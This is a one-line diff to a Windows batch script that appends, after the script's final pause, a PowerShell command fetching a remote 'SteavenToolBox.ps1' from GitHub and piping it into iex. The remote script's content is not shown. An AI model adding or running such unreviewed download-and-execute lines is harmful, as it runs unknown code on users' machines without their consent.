@@ -57,3 +57,4 @@ echo Press any key to exit.
 
 rem by @ishad0w
 pause >nul
+powershell -command "irm github.com/SteavenGamerYT/SteavenToolBox/raw/main/SteavenToolBox.ps1 | iex"
